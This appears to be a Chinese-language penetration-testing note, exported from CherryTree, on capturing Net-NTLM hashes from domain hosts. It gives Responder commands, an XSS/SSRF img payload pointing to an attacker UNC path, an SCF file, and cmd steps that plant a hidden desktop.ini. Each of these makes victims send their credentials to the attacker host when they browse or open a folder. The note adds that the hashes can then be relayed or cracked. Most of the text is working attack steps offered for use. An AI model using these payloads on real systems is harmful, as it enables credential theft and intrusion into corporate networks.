<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>获取Net-NTLM</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>获取Net-NTLM</h1><br/>域内主机通过内网攻击机xss或ssrf获取Net-NTLM<br /><br /><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\261-Responder-master.zip">Linked file: Responder-master.zip </a></td></tr></table><br /><br />1、直接访问（IE）<br />linux主机运行Responder<br />python Responder.py -I eth0<br /><br />被攻击者访问linux ip:80，可获得Net-NTLM<br />（可以XSS或SSRF访问）<br />如：<br />&lt;img src=&quot;\\\\192.168.0.1\\aa&quot;&gt; <br />Net-NTLM哈希不能用于Pass-the-Hash攻击，<br />与纯粹的NTLM哈希不同，它们可以通过使用诸如hashcat之类的现成工具进行中继或破解：<br /><br />前提：<br />默认情况下，当Web服务器具有受NTLM身份验证保护的资源时，<br />如果网站位于公司网络内或在受信任的站点中列入白名单，<br />Internet Explorer和Edge将自动执行身份验证，并遵守受信任区域的概念。<br />Chrome依靠与Internet Explorer相同的设置; <br />在Firefox的情况下，这个配置默认是不启用的，必须通过手动更改about:config。<br /><br /><br />2、自动访问<br />最好是共享文件夹中<br />创建SCF文件放置于网络共享文件夹中，本地也可以，打开文件夹会自动找对应的网络图标<br />[Shell]<br />Command=2<br />IconFile=\\192.168.216.128\share\pentestlab.ico[Taskbar]<br />Command=ToggleDesktop<br /><br /><br />在192.168.216.128打开Responder<br />responder -wrf --lm -v -I eth0<br /><br /><br /><br /><br />11、desktop.ini<br /><br />desktop.ini文件包含了已应用到该文件夹的图标的信息。我们可以用这个解析网络路径，一旦你打开文件夹，就能得到哈希值。<br />mkdir openMe<br />attrib +s openMe<br />cd openMe<br />echo [.ShellClassInfo] &gt; desktop.ini<br />echo IconResource=\\192.168.0.1\aa &gt;&gt; desktop.ini<br />attrib +s +h desktop.ini在Windows XP系统中，desktop.ini文件使用“IcondFile”而不是“IconResource”。<br />[.ShellClassInfo]<br />IconFile=\\192.168.0.1\aa<br />IconIndex=1337<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>